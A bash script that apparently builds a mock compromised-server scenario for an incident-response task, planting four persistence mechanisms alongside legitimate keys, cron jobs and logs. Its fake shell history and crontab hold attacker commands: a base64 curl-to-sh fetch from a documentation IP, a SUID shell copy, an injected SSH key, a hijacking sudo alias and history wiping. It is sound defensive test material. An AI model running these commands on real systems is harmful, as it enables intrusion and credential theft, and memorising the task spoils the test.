#!/bin/bash
# Account `deploy` was compromised. The attacker (random documentation-range IP) logged in
# with the password after the scanner (another IP, failures only), then used a key they added.
# Four persistence mechanisms, all random in detail:
#   1. a 4th key in authorized_keys whose comment copies a legitimate key's comment
#   2. a cron job in the (mock) crontab spool whose command is a base64 blob
#   3. `alias sudo='$HOME/.cache/.sysd/sw'` at line 130-160 of .bashrc, after a block of blank lines
#   4. a SUID shell copy home/deploy/.cache/.sysd/sh (stub file, mode 4755)
# Legit items that must survive: 3 keys, 2 cron jobs + MAILTO, other aliases, a SUID passwd at
# usr/bin/passwd. Evidence (auth.log, .bash_history) must be kept. Keys are throwaway pairs made
# here with ssh-keygen; the private halves are deleted at once.
SANDBOX="$1"
cd "$SANDBOX" || exit 1
rm -rf home var usr bin iocs.txt .lm-state; mkdir -p .lm-state home/deploy/.ssh home/deploy/bin home/deploy/.cache/.sysd var/log usr/bin
MOCKS="$(cd "$(dirname "$0")/../../../mocks" && pwd)"
bash "$MOCKS/cron/install.sh" "$SANDBOX" --user deploy crontab >/dev/null 2>&1 || exit 1

rnd() { LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom | head -c "$1"; }
atk=203.0.113.$((10 + RANDOM % 200)); scan=198.51.100.$((10 + RANDOM % 200)); legit=10.0.0.$((10 + RANDOM % 40))
# ---- keys ---------------------------------------------------------------------
K=.lm-state/k; mkdir -p $K
mkkey() { ssh-keygen -q -t ed25519 -N '' -C "$2" -f "$K/$1" >/dev/null 2>&1; }
mkkey admin "jalil@laptop"; mkkey ci "ci@build-01"; mkkey ops "ops@jump"
mkkey atk "ci@build-01"                      # the comment is copied from the CI key
fp() { ssh-keygen -lf "$1" | awk '{print $2}'; }
fp_admin=$(fp $K/admin.pub); fp_ci=$(fp $K/ci.pub); fp_ops=$(fp $K/ops.pub); fp_atk=$(fp $K/atk.pub)
{ cat $K/admin.pub; cat $K/ci.pub
  [ $((RANDOM % 2)) -eq 0 ] && { cat $K/atk.pub; cat $K/ops.pub; } || { cat $K/ops.pub; cat $K/atk.pub; }; } > home/deploy/.ssh/authorized_keys
atkline=$(cat $K/atk.pub)
rm -rf $K
chmod 700 home/deploy/.ssh; chmod 600 home/deploy/.ssh/authorized_keys
printf '%s\n' "$fp_admin" "$fp_ci" "$fp_ops" | LC_ALL=C sort > .lm-state/legit.fps
printf '%s\n' "${fp_atk#SHA256:}" > .lm-state/atk.fp
printf '%s\n' "$atk" > .lm-state/atk.ip
printf '%s\n' "$scan" "$legit" "${fp_admin#SHA256:}" "${fp_ci#SHA256:}" "${fp_ops#SHA256:}" > .lm-state/decoys

# ---- auth.log ------------------------------------------------------------------
{
  for d in "Nov  8 09:12:44" "Nov  8 17:30:02" "Nov  9 08:55:19"; do
    echo "$d srv sshd[$((1000 + RANDOM % 900))]: Accepted publickey for deploy from $legit port $((40000 + RANDOM % 9000)) ssh2: ED25519 $fp_ci"
    echo "$d srv sshd[$((1000 + RANDOM % 900))]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"
  done
  echo "Nov  9 10:02:11 srv sshd[1432]: Accepted publickey for deploy from $legit port 51122 ssh2: ED25519 $fp_admin"
  echo "Nov  9 10:40:15 srv sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app"
  for i in 1 2 3 4 5 6; do echo "Nov  9 2$((i % 2)):0$i:3$i srv sshd[$((2000 + i))]: Failed password for invalid user admin from $scan port $((50000 + i)) ssh2"; done
  for i in 1 2 3; do echo "Nov  9 23:41:0$i srv sshd[$((2900 + i))]: Failed password for deploy from $atk port $((40010 + i)) ssh2"; done
  echo "Nov  9 23:41:55 srv sshd[2955]: Accepted password for deploy from $atk port 40118 ssh2"
  echo "Nov  9 23:41:55 srv sshd[2955]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"
  echo "Nov  9 23:49:30 srv sshd[2955]: pam_unix(sshd:session): session closed for user deploy"
  echo "Nov 10 00:10:20 srv sshd[3104]: Accepted publickey for deploy from $atk port 40222 ssh2: ED25519 $fp_atk"
  echo "Nov 10 00:10:21 srv sshd[3104]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"
  echo "Nov 10 00:31:08 srv sshd[3104]: pam_unix(sshd:session): session closed for user deploy"
  echo "Nov 10 02:00:01 srv CRON[3321]: (deploy) CMD (/home/deploy/bin/backup.sh)"
} | LC_ALL=C sort -s -k1,1M -k2,2n -k3,3 > var/log/auth.log

# ---- history -------------------------------------------------------------------------
blob=$(printf 'curl -s http://%s/s.sh | sh' "$atk" | base64 | tr -d '\n')
{
  printf '%s\n' "cd ~/bin" "ls -la" "./healthcheck.sh" "vim backup.sh" "git -C ~/app pull" "docker ps" "tail -n 20 ~/health.log" "df -h"
  printf '%s\n' "curl -s http://$atk/x -o /tmp/.x" "chmod +x /tmp/.x" "id; uname -a" "cat /etc/passwd"
  echo "echo '$atkline' >> ~/.ssh/authorized_keys"
  echo "cp /bin/sh ~/.cache/.sysd/sh && chmod 4755 ~/.cache/.sysd/sh"
  echo "(crontab -l; echo '*/7 * * * * echo $blob | base64 -d | sh') | crontab -"
  echo "echo \"alias sudo='\$HOME/.cache/.sysd/sw'\" >> ~/.bashrc"
  printf '%s\n' "rm /tmp/.x" "history -c" "exit"
} > home/deploy/.bash_history; chmod 600 home/deploy/.bash_history

# ---- .bashrc: attacker alias hidden after blank lines ------------------------------------
target=$((130 + RANDOM % 31))
{
  cat <<'RC'
# ~/.bashrc for deploy
case $- in *i*) ;; *) return ;; esac
HISTCONTROL=ignoredups
HISTSIZE=1000
shopt -s histappend checkwinsize
PS1='\u@\h:\w\$ '
export EDITOR=vim
alias ll='ls -alF'
alias gs='git status'
alias k='kubectl'
alias please='sudo'
alias dps='docker ps --format "table {{.Names}}\t{{.Status}}"'
# deployment helpers
deploy_app() { git -C ~/app pull && systemctl --user restart app; }
RC
} > home/deploy/.bashrc
base=$(wc -l < home/deploy/.bashrc)
for ((i = base + 1; i < target; i++)); do echo >> home/deploy/.bashrc; done
printf '%s\n' "alias sudo='\$HOME/.cache/.sysd/sw'" 'export PATH="$HOME/bin:$PATH"' >> home/deploy/.bashrc
grep -n "sysd" home/deploy/.bashrc | cut -d: -f2- > .lm-state/bashrc.bad
grep -vF "sysd/sw" home/deploy/.bashrc | grep -v '^$' > .lm-state/bashrc.good

# ---- the SUID copy and the legitimate SUID ----------------------------------------------
printf '#!/bin/sh\n# stand-in for a copied shell (training data)\n' > home/deploy/.cache/.sysd/sh; chmod 4755 home/deploy/.cache/.sysd/sh
printf '#!/bin/sh\n# stand-in for a credential-logging sudo wrapper\nexec /usr/bin/sudo "$@"\n' > home/deploy/.cache/.sysd/sw; chmod 755 home/deploy/.cache/.sysd/sw
printf '#!/bin/sh\n# stand-in for passwd\n' > usr/bin/passwd; chmod 4755 usr/bin/passwd
printf '#!/bin/sh\necho backup\n' > home/deploy/bin/backup.sh; printf '#!/bin/sh\necho ok\n' > home/deploy/bin/healthcheck.sh; chmod 755 home/deploy/bin/*.sh

# ---- cron spool via the mock crontab ------------------------------------------------------
legitcron=$(printf '%s\n' 'MAILTO=ops@example.com' '0 3 * * * /home/deploy/bin/backup.sh' '*/15 * * * * /home/deploy/bin/healthcheck.sh >> /home/deploy/health.log 2>&1')
printf '%s\n' "$legitcron" > .lm-state/cron.legit
bad="*/7 * * * * echo $blob | base64 -d | sh"
cl=('MAILTO=ops@example.com' '0 3 * * * /home/deploy/bin/backup.sh' '*/15 * * * * /home/deploy/bin/healthcheck.sh >> /home/deploy/health.log 2>&1')
pos=$((1 + RANDOM % 3))
{ for ((i = 0; i < 3; i++)); do [ $i -eq $pos ] && echo "$bad"; echo "${cl[i]}"; done; [ $pos -eq 3 ] && echo "$bad"; } > .lm-state/cron.tmp
bin/crontab .lm-state/cron.tmp >/dev/null 2>&1 || exit 1
rm -f .lm-state/cron.tmp
printf '%s' "$blob" > .lm-state/blob

# ---- mtimes: legit files old, attacker's recent ---------------------------------------------
touch -d '2026-09-15 10:00' home/deploy/bin/*.sh usr/bin/passwd home/deploy/.profile 2>/dev/null
touch -d '2026-11-10 00:12' home/deploy/.ssh/authorized_keys home/deploy/.bashrc home/deploy/.cache/.sysd/sh home/deploy/.cache/.sysd/sw
# evidence to keep
sha256sum var/log/auth.log home/deploy/.bash_history > .lm-state/evidence.sha
